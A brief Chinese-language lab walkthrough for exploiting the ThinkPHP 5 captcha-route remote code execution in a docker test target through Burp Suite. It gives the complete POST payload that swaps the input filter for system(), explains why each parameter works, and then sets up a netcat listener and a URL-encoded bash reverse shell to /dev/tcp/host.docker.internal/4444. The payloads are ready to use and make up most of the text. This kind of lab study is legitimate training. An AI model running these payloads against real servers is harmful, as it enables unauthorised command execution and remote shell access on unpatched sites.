打开靶场：
```
docker compose up -d
```
进burpsuite修改头文件

首先需要把GET改为POST
```
POST /index.php?s=captcha
```

添加一行
```
Content-Type: application/x-www-form-urlencoded
```
因为PHP靠`Content-Type`才知道怎么解析请求体
PHP不解析body
`$_POST`为空
payload无效

添加参数：
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```
`_method=_construct`(内部构造函数)：因为ThinkPHP允许POST里指定HTTP方法，但方法名没校验，伪造成`_construct`，走特殊流程处理
`filter[]=system`：把输入过滤器换成system函数：因为ThinkPHP处理输入时会对值做过滤（filter），过滤器被换成system=过滤时执行命令
`method=get`：配合参数（让流程走到处理输入的分支）
`server[REQUSET_METHOD]=id`：塞一个“要被过滤的值”

接下来反弹shell
先监听：
```
nc -lv 4444
```
然后将id改为：
```
bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/host.docker.internal/4444%200%3E%261'
```
即可

URL编译翻译过来
```
bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'
```
